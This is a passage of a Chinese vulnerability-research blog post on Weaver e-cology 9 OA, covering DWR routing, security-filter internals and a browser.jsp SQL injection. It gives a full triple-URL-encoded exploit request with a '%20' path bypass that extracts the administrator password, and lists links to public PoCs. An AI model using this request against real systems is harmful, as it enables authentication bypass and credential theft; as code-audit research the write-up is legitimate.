+<p>不过在这儿之前，先问问AI dwr是什么。</p>
+<p>DWR 是 Direct Web Remoting 的缩写，是一个 Java Web 框架&#x2F;组件，主要作用是：</p>
+<p>让浏览器端的 JavaScript 可以像调用本地 JS 函数一样，直接调用服务器端的 Java 方法。</p>
+<p>这个功能很熟悉，就是调用特定类的特定方法，很多漏洞都是因此产生的。</p>
+<p>再简单看一下请求体里的各个参数：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778489858587-e9c2c6c6-36ca-464a-9ce4-7eff032b2fe6.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778489870662-03b37470-e3be-4ddc-bdd3-ce6f6516cb55.png"  alt="img"></p>
+<p>回到代码，跟进org.directwebremoting.dwrp.BaseCallMarshaller#marshallInbound：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778490004863-3adb9848-a2ac-4ace-90c5-3d38b1c1de98.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778490082612-b556446b-20ab-4016-9fe3-04602a0a3c17.png"  alt="img"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">weaver.docs.docs.DocCheckInOutUtil</span><br><span class="line">weaver.docs.docs.DocDwrUtil</span><br><span class="line">weaver.cpt.util.CptDwrUtil</span><br><span class="line">weaver.fna.budget.BudgetHandler</span><br><span class="line">weaver.docs.DocDetailLog</span><br><span class="line">weaver.docs.category.DocTreeDocFieldUtil</span><br><span class="line">weaver.workflow.workflow.WorkflowSubwfSetUtil</span><br><span class="line">weaver.workflow.msg.MsgUtil</span><br><span class="line">weaver.dwr.HrmUtil</span><br><span class="line">weaver.proj.Maint.ProjTaskUtil</span><br><span class="line">weaver.docs.senddoc.DocReceiveUnitUtil</span><br><span class="line">weaver.dwr.Validator</span><br><span class="line">weaver.docs.docs.DocReadTagUtil</span><br></pre></td></tr></table></figure>
+
+<p>这些类的方法都可以调用，都是潜在攻击面。（然而稍微新一点的版本里的SQL注入点全没了，而且大部分需要携带有效session才能真正调用）</p>
+<p>不过拿到方法后，还会做校验：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778223016841-c6b06832-d521-4b9e-b5d5-5c15c95ea950.png"  alt="img"></p>
+<p>最好自己跟进看一下，会清楚很多。</p>
+<p>总结一下部分规则。</p>
+<p>只有public方法可调用。</p>
+<p>有些类只能调用特定方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778223230056-f0e72e9b-deb1-45cf-836c-9091e2347eb5.png"  alt="img"></p>
+<p>类和方法参数类型不能以org.directwebremoting.开头：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778223417929-59549337-de8e-4f6e-b057-743eeaa9edb0.png"  alt="img"></p>
+<h2 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h2><p>1、&#x2F;dwr&#x2F;*能够调用的类方法有哪些（dwr路由逻辑）</p>
+<h1 id="browser-jsp-SQL注入"><a href="#browser-jsp-SQL注入" class="headerlink" title="browser.jsp SQL注入"></a>browser.jsp SQL注入</h1><p>这类漏洞都是直接访问jsp，要过滤的话基本都是在class安全策略里。具体漏洞具体分析，这里以browser.jsp SQL注入漏洞为例。</p>
+<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/%20/plugin/browser.jsp?isDis=1&amp;browserTypeId=269&amp;keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%38%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%35%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%30%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%38%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%34%25%32%35%25%33%35%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%34%25%36%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%37%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%33%38%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%33%34%25%32%35%25%33%33%25%36%34%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%39%25%32%35%25%33%36%25%36%34%25%32%35%25%33%37%25%33%39%25%32%35%25%33%35%25%36%36%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%32%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%33</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8060</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+<p>axa%’ union select 1,(select password from HrmResourceManager where id&#x3D;1))my_table)r#</p>
+<p>最终执行的语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> r.<span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> my_table.<span class="operator">*</span>  <span class="keyword">from</span> (<span class="keyword">select</span>  <span class="keyword">distinct</span> t1.id <span class="keyword">as</span> id,t1.name <span class="keyword">as</span> name  <span class="keyword">from</span>  meeting_remind_type t1  <span class="keyword">where</span> isuse<span class="operator">=</span><span class="number">1</span>  <span class="keyword">and</span> t1.name <span class="keyword">like</span> <span class="string">&#x27;%axa%&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> HrmResourceManager <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>))my_table)r# <span class="string">&#x27;%&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> t1.id <span class="keyword">desc</span>) my_table  limit <span class="number">0</span>,<span class="number">10</span>) r </span><br></pre></td></tr></table></figure>
+
+<p>三次URL编码</p>
+<p>中间件自动一次。</p>
+<p>jsp里一次：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778207318455-e2029104-38c7-4574-8e63-13aeb50fac53.png"  alt="img"></p>
+<p>java方法中一次：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778207354957-37a36e09-210f-4f74-9ed0-8c1867e0486b.png"  alt="img"></p>
+<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>browser.jsp：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778598626925-d131c3d5-2f46-4e6e-bce6-1f6fce19d53e.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778598674662-4b7c536c-e830-496e-ab00-d81ead5ad1e6.png"  alt="img"></p>
+<p>isDir必须是1，不然会请求转发到&#x2F;mobile&#x2F;plugin&#x2F;dialog.jsp</p>
+<p>keyword和browserTypeId都会设置到BrowserAction，最终调用weaver.mobile.webservices.common.BrowserAction#getBrowserData：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778598718775-6e3aea95-f262-4e7f-a06a-6fa2abc649e0.png"  alt="img"></p>
+<p>browserTypeId&#x3D;269是为了进入对应的if，这个if执行的方法，返回的数据内容最为完整，跟进：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778598847605-210046ac-5920-4a67-a62c-df5af1e6c593.png"  alt="img"></p>
+<p>很多文章说sql注入点在上面的var1.executeSql(var2); 但我感觉不太对，因为虽然能够实现延时注入，但并不能直接回显执行结果。真正的注入点应该继续跟进下面的getLimitPageData：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778599012030-5c853553-5c0d-4294-83dd-eec148683c62.png"  alt="img"></p>
+<p>最终是在这里执行并取结果：</p>
+<p>weaver.general.SplitPageUtil#getCurrentPageRs(int, int)</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778208437533-6701f823-7175-457d-8fed-759890bf7371.png"  alt="img"></p>
+<h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>URL中的%20为什么能绕过？</p>
+<p>有两个原因：</p>
+<p>1、resin能自动忽略%20</p>
+<p>2、安全策略中没有对%20进行拦截</p>
+<p>先看resin为什么能自己忽略%20，这里我们不去看resin处理path的具体逻辑，而是通过调试执行表达式快速判断：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778674630704-e3eddba7-14d5-44e4-8219-dda848793cdd.png"  alt="img"></p>
+<p>可以看到getRequestURI的结果是带有%20，而getServletPath的结果没有%20，resin真正接受到的是getServletPath，故会自动忽略掉%20</p>
+<p>再看%20为什么能绕过安全策略，这里不加%20，能发现会在weaver.security.rules.ruleImp.SecurityRuleMobile29被拦截：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778674828966-b7c5a6e7-51a8-4a2d-b529-3dca87bdf24f.png"  alt="img"></p>
+<p>path处理后变成&#x2F;mobile&#x2F;&#x2F;plugin&#x2F;browser.jsp，不会匹配上mobile-need-login-urls，直接放行。同时其他的安全规则也没有拦截&#x2F;&#x2F;的，所以能够绕过。</p>
+<h2 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h2><p>.jsp类的路径，一般会通过安全规则过滤，所以得具体情况具体分析了，没有太多通用思路。</p>
+<h1 id="do"><a href="#do" class="headerlink" title="*.do"></a>*.do</h1><p>这类路由暂时没遇到过。</p>
+<h1 id="SecurityMain"><a href="#SecurityMain" class="headerlink" title="SecurityMain"></a>SecurityMain</h1><p>再回头来总结一下SecurityMain里的要点。</p>
+<p>安全过滤的主要类，其process方法会在SecrityFilter被反射调用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778125911514-46840a7a-2626-42a3-b641-3464b66a35d9.png"  alt="img"></p>
+<p>实际安全逻辑在SecurityMain#process，里面有两个executeCustomRules方法，会调用安全规则过滤，一个是this.executeCustomRules，还有一个是SecurityCore.executeCustomRules：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778125808909-83e97659-4231-4ec6-ba23-d5323682be70.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778131211474-ab418fb9-9e42-4b5e-93d2-0db176e66a30.png"  alt="img"></p>
+<p>this里的会先遍历固定的几个安全规则，然后对URL路径校验：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778131824686-a09c7534-4bb3-404e-969c-fb85a35ed816.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778131842025-ae78edef-2e5b-4bef-b31b-b27b071de94d.png"  alt="img"></p>
+<p>SecurityCore会遍历所有RuleClass的validate方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778131282967-3954e85e-3b38-422a-82bc-09eaa81fa9f1.png"  alt="img"></p>
+<p>RuleClass位于WEB-INF\myclasses\weaver\security\rules\ruleImp</p>
+<p>之后还有一个isLogin，判断当前访问路径是否能在未登录的情况下访问：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1778132160471-57b1cf38-cc60-4ce2-ac06-1188c5359606.png"  alt="img"></p>
+<p>不展开了，可以直接问AI，或具体情况具体分析。</p>
+<h1 id="1day分析思路"><a href="#1day分析思路" class="headerlink" title="1day分析思路"></a>1day分析思路</h1><p>从官网下载最新的增量补丁，看\WEB-INF\myclasses\weaver\security\rules\ruleImp里新增了哪些类就行。或者对比最近的两个全量补丁。新增类中大概率会有漏洞路径。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里知道了：</p>
+<p>1、weaver.security.webcontainer.XssRequestWeblogic会通过getParameter等对GET或POST参数进行过滤</p>
+<p>2、SecurityMain：两个executeCustomRules会生效安全策略；isLogin方法得绕过返回true</p>
+<p>3、&#x2F;weaver&#x2F;* 的路由逻辑</p>
+<p>4、&#x2F;api&#x2F;*的路由逻辑</p>
+<p>5、&#x2F;services&#x2F;*的路由逻辑</p>
+<p>6、&#x2F;dwr&#x2F;*的路由逻辑</p>
+<p>还有一些比较经典的漏洞没有分析，都放在参考文章里了，经过上面的学习，大家可以尝试自行分析。</p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a class="link"   target="_blank" rel="noopener" href="https://e-cloudstore.com/doc.html?appId=84e77d7890a14c439590b37707251859" >https://e-cloudstore.com/doc.html?appId=84e77d7890a14c439590b37707251859<i class="fas fa-external-link-alt"></i></a>  Jersey接口（&#x2F;api&#x2F;*）</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://e-cloudstore.com/ec/api/applist/index.html#/" >https://e-cloudstore.com/ec/api/applist/index.html#/<i class="fas fa-external-link-alt"></i></a>  后端接口文档</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://e-cloudstore.com/e9/file/E9BackendDdevelopmentGuide.pdf" >https://e-cloudstore.com/e9/file/E9BackendDdevelopmentGuide.pdf<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.weaver.com.cn/cs/securityDownload.html?src=cn" >https://www.weaver.com.cn/cs/securityDownload.html?src=cn<i class="fas fa-external-link-alt"></i></a>  安全补丁</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://web.archive.org/web/20230511234043/https://www.weaver.com.cn/cs/securityDownload.html#" >https://web.archive.org/web/20230511234043/https://www.weaver.com.cn/cs/securityDownload.html#<i class="fas fa-external-link-alt"></i></a>  安全补丁老页面</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://e-cloudstore.com/e9/index3.html" >https://e-cloudstore.com/e9/index3.html<i class="fas fa-external-link-alt"></i></a>  开放文档</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.weaver.com.cn/cs/security/edm20250704_opiurutjvmopimdwytdc.html" >https://www.weaver.com.cn/cs/security/edm20250704_opiurutjvmopimdwytdc.html<i class="fas fa-external-link-alt"></i></a>   安全邮件</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/ax1sX/SecurityList/blob/main/Java_OA/EcologyAudit.md" >https://github.com/ax1sX/SecurityList/blob/main/Java_OA/EcologyAudit.md<i class="fas fa-external-link-alt"></i></a> 整体梳理</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology-KtreeUploadAction%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md" >https://github.com/eeeeeeeeee-code/POC<i class="fas fa-external-link-alt"></i></a> 各种POC</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://y4tacker.github.io/2025/07/09/year/2025/07/%E5%A6%82%E4%BD%95%E4%BB%8E%E7%81%B0%E7%9B%92%E8%A7%92%E5%BA%A6%E5%BF%AB%E9%80%9F%E5%A4%8D%E7%8E%B0Weaver-SQL%E6%B3%A8%E5%85%A5/" >https://y4tacker.github.io/2025/07/09/year/2025/07/%E5%A6%82%E4%BD%95%E4%BB%8E%E7%81%B0%E7%9B%92%E8%A7%92%E5%BA%A6%E5%BF%AB%E9%80%9F%E5%A4%8D%E7%8E%B0Weaver-SQL%E6%B3%A8%E5%85%A5/<i class="fas fa-external-link-alt"></i></a> 方法论+&#x2F;api&#x2F;doc&#x2F;out&#x2F;more&#x2F;list SQL注入</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/2BVjH31Zy6re8a4cB8p3JA" >https://mp.weixin.qq.com/s/2BVjH31Zy6re8a4cB8p3JA<i class="fas fa-external-link-alt"></i></a>  历史RCE</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ici5AObKdigpKjL1kMVN8w" >https://mp.weixin.qq.com/s/Ici5AObKdigpKjL1kMVN8w<i class="fas fa-external-link-alt"></i></a>  JDBC</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://jeva.cc/2872.html" >https://jeva.cc/2872.html<i class="fas fa-external-link-alt"></i></a>  uploaderOperate.jsp+OfficeServer文件上传</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://jeva.cc/2818.html" >https://jeva.cc/2818.html<i class="fas fa-external-link-alt"></i></a>  &#x2F;api&#x2F;cpt&#x2F;inventory&#x2F;docptimpoptinventory 文件上传</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36618918/article/details/135104295" >https://blog.csdn.net/qq_36618918/article/details/135104295<i class="fas fa-external-link-alt"></i></a>  XmlRpcServlet文件读取</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://0xf4n9x.github.io/weaver-ecology9-changeuserinfo-ofslogin.html" >https://0xf4n9x.github.io/weaver-ecology9-changeuserinfo-ofslogin.html<i class="fas fa-external-link-alt"></i></a>  changeUserInfo信息泄漏及ofsLogin任意用户登录</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90940" >https://xz.aliyun.com/news/90940<i class="fas fa-external-link-alt"></i></a>  后台JDBC RCE</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15082" >https://xz.aliyun.com/news/15082<i class="fas fa-external-link-alt"></i></a>  browser.jsp 鉴权绕过+SQL注入</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14839" >https://xz.aliyun.com/news/14839<i class="fas fa-external-link-alt"></i></a>  鉴权绕过+后台JDBC RCE  e10的</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18849" >https://xz.aliyun.com/news/18849<i class="fas fa-external-link-alt"></i></a> &#x2F;dwr&#x2F;call&#x2F;plaincall鉴权绕过+RCE</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14777" >https://xz.aliyun.com/news/14777<i class="fas fa-external-link-alt"></i></a>  WorkPlanService SQL注入</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12974" >https://xz.aliyun.com/news/12974<i class="fas fa-external-link-alt"></i></a>  bsh+xstream老漏洞+resin内存马</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11393" >https://xz.aliyun.com/news/11393<i class="fas fa-external-link-alt"></i></a> getInterfaceRegisterCustomOperation后台RCE</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8016" >https://xz.aliyun.com/news/8016<i class="fas fa-external-link-alt"></i></a> <a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6135" >https://xz.aliyun.com/news/6135<i class="fas fa-external-link-alt"></i></a> &#x2F;mobile&#x2F;WorkflowCenterTreeData.jsp + &#x2F;mobile&#x2F;plugin&#x2F;SyncUserInfo.jsp SQL注入   19年的了很老</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                泛微e9分析思路
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/05/13/泛微e9分析思路/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2026-05-13 20:42</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/04/16/%E5%A4%A7%E5%8D%8EICC%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E4%BB%8E%E4%B8%A4%E5%B1%82%E6%8E%A5%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%88%B0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"
+                                   title="某华ICC智能物联综合管理平台历史漏洞分析（一）——从两层接口转发到漏洞利用"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">某华ICC智能物联综合管理平台历史漏洞分析（一）——从两层接口转发到漏洞利用</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%89%8D%E7%BD%AE%E5%B7%A5%E4%BD%9C"><span class="nav-number">3.</span> <span class="nav-text">分析前置工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E7%BB%98%E6%8C%87%E7%BA%B9"><span class="nav-number">4.</span> <span class="nav-text">测绘指纹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FileDownloadLocation%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">5.</span> <span class="nav-text">FileDownloadLocation文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E5%8F%98%E5%BD%A2%E5%88%86%E6%9E%90"><span class="nav-number">5.2.</span> <span class="nav-text">SQL变形分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="nav-number">5.3.</span> <span class="nav-text">登录绕过分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E7%94%9F%E6%95%88%E7%82%B9%E4%B8%80"><span class="nav-number">5.4.</span> <span class="nav-text">安全策略生效点一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">5.5.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XmlRpcServlet%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">6.</span> <span class="nav-text">XmlRpcServlet文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-number">6.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#api-doc-out-more-list-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">&#x2F;api&#x2F;doc&#x2F;out&#x2F;more&#x2F;list SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">7.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SessionFilter"><span class="nav-number">7.3.</span> <span class="nav-text">SessionFilter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-2"><span class="nav-number">7.4.</span> <span 